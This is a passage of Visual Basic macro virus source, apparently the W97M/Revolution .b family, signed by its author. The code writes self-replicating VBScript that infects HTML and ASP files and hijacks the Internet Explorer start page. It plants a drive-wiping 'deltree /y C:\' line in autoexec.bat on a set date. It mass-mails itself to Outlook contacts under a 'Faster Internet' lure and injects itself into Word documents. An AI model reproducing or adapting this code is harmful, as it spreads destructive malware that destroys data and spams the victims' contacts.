Print #1, "FLSrch.LookIn = " & Chr(34) & "C:\" & Chr(34)
' Slight modification can make all the difference
Print #1, "FLSrch.SearchSubFolders = True"
Print #1, "FLSrch.FileName = " & Chr(34) & "*.htm*" & Chr(34)
Print #1, "FLSrch.Execute"
Print #1, "For t = 1 To FLSrch.FoundFiles.Count"
Print #1, "Set InFX = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "f = InFX.readline"
Print #1, "InFX.Close"
Print #1, "If f <> " & Chr(34) & "<html><!--HTML/Devolve .c-->" & Chr(34) & " Then"
Print #1, "Set TxtRng = Document.body.createTextRange"
Print #1, "Set Devolve = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "Contents = Devolve.readall"
Print #1, "Devolve.Close"
Print #1, "Set Kry = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 2, True)"
Print #1, "Kry.writeline " & Chr(34) & "<html><!--HTML/Devolve .c-->" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "<body>" & Chr(34)
Print #1, "Kry.writeline TxtRng.HTMLText"
Print #1, "Kry.writeline " & Chr(34) & "</body>" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "</html>" & Chr(34)
Print #1, "Kry.writeline Contents"
Print #1, "Kry.Close"
Print #1, "End If"
Print #1, "Next"
Print #1, "wordobj.Quit"
Print #1, "End Sub"
Print #1, "Sub Payload()"
Print #1, "If Day(Now) = 18 Then"
Print #1, "Set FLSysObj = CreateObject" & Chr(40) & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & Chr(41)
Print #1, "Set g = opentextfile(" & Chr(34) & "c:\autoexec.bat" & Chr(34) & ", 2, True)"
Print #1, "g.writeline " & Chr(34) & "echo off" & Chr(34)
Print #1, "g.writeline " & Chr(34) & "@deltree /y C:\" & Chr(34)
Print #1, "g.Close"
Print #1, "End If"
Print #1, "End Sub"
Print #1, "</SCRIPT>"
Print #1, "</body>"
Print #1, "</html>"
Close #1
' Self-Replicating HTML Virus HTML/Devolve .c
' HTML/Devolve .a = Prototype infected *.htm
' HTML/Devolve .b = infected *.htm*
' NOW WATCH ME!!
nowhere = Int(Rnd(1) * 2) + 1
If nowhere = 1 Then Call HTML_Send
End If
If rvg = 1 Then
' -------------------------------------------------
' HTML/Devious
' Drop HTML/Devious .a strain ASP infecting virus
' Self-Replicating version
' -------------------------------------------------
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main", "Start Page") = "C:\Windows\System\Error.html"
Open "C:\windows\system\Error.html" For Output As #1
Print #1, "<html><!--HTML/Devious .a-->"
Print #1, "<body>"
Print #1, "<SCRIPT language=vbscript>"
Print #1, "Sub Window_OnLoad()"
Print #1, "Set FLSysObj = CreateObject" & Chr(40) & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & Chr(41)
Print #1, "Set wordobj = CreateObject" & Chr(40) & Chr(34) & "Word.application" & Chr(34) & Chr(41)
Print #1, "Set FLSrch = wordobj.Application.FileSearch"
Print #1, "FLSrch.NewSearch"
Print #1, "FLSrch.LookIn = " & Chr(34) & "C:\" & Chr(34)
' Slight modification can make all the difference
Print #1, "FLSrch.SearchSubFolders = True"
Print #1, "FLSrch.FileName = " & Chr(34) & "*.asp" & Chr(34)
Print #1, "FLSrch.Execute"
Print #1, "For t = 1 To FLSrch.FoundFiles.Count"
Print #1, "Set InFX = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "f = InFX.readline"
Print #1, "InFX.Close"
Print #1, "If f <> " & Chr(34) & "<html><!--HTML/Devious .a-->" & Chr(34) & " Then"
Print #1, "Set TxtRng = Document.body.createTextRange"
Print #1, "Set Devolve = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "Contents = Devolve.readall"
Print #1, "Devolve.Close"
Print #1, "Set Kry = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 2, True)"
Print #1, "Kry.writeline " & Chr(34) & "<html><!--HTML/Devious .a-->" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "<body>" & Chr(34)
Print #1, "Kry.writeline TxtRng.HTMLText"
Print #1, "Kry.writeline " & Chr(34) & "</body>" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "</html>" & Chr(34)
Print #1, "Kry.writeline Contents"
Print #1, "Kry.Close"
Print #1, "End If"
Print #1, "Next"
Print #1, "wordobj.Quit"
Print #1, "End Sub"
Print #1, "</SCRIPT>"
Print #1, "</body>"
Print #1, "</html>"
Close #1
' Self-Replicating HTML Virus HTML/Devious .a
' Prototype
End If
End Function
Function HTML_Send()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "HTML/Devolve .c") <> "by Error" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
x = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
Spawnme.Recipients.Add Peep
x = x + 1
If x > 40 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Faster Internet"
Spawnme.Body = "Do you want faster internet?  Then open the attached webpage to find out more about NeXuS Telecommunications!!  We can bring you connections of 112K or faster!!"
Spawnme.Attachments.Add "C:\windows\system\Startup.html"
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "HTML/Devolve .c") = "by Error"
End If
End Function
' look for W97M/Agony by Nex, A Direct-Action-Infecting W97/2K MV
Sub Direct_Action_Infection()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Virname = ""
FileInf = False
FileID = ""
Set wordobj = CreateObject("word.application")
Set Fs = wordobj.Application.FileSearch
Fs.LookIn = CurDir
Fs.SearchSubFolders = True
Fs.Filename = "*.doc"
Fs.Execute
For x = 1 To Fs.FoundFiles.Count
wordobj.Application.Documents.Open Filename:=Fs.FoundFiles(x)
MsgBox Fs.FoundFiles(x)
Open "C:\windows\system\Extras.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To wordobj.Application.ActiveDocument.VBProject.VBComponents.Count
    If wordobj.Application.ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If wordobj.Application.ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo nextinf
    If wordobj.Application.ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
Close #1
FileInf = False
 Open "C:\windows\system\Addins.cpl" For Input As #1
Line Input #1, FileID
MsgBox FileID
Close #1
With wordobj.Application.ActiveDocument.VBProject.VBComponents.Import(FileID)
End With
 wordobj.Application.ActiveDocument.SaveAs Filename:=Fs.FoundFiles(x)
wordobj.Application.ActiveDocument.Close
nextinf:
wordobj.Application.ActiveDocument.SaveAs Filename:=Fs.FoundFiles(x)
wordobj.Application.ActiveDocument.Close
Next x
wordobj.Quit
End Sub
' W97M/Revolution .b aka W97M/Evolutuion @mm series
' One of the most polymorphic and LARGEST MV In existance...
' Size does matter...
' Brought to you from Error at TN
' EOF


